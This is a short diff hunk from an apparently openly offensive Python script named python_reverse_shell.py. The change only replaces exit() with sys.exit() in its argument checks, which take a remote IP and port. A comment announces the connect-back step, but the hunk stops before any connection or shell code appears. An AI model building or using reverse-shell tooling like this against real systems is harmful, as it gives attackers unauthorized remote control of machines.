@@ -38,19 +38,19 @@ Check arguments
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
-        exit(0)
+        sys.exit(0)
 
     if len(sys.argv) == 2:
         if sys.argv[1] == "-h":
             print("\n >>> Reverse SHELL")
             print("\n >>> USAR: python_reverse_shell.py <Remote_IP> <Remote_Port>")
-            exit(0)
-        exit(0)
+            sys.exit(0)
+        sys.exit(0)
     if len(sys.argv) == 3:
         remote_ip = str(sys.argv[1])
         remote_port = int(sys.argv[2])
     else:
-        exit(0)
+        sys.exit(0)
 
     """
     Begin process to connect back to home :)
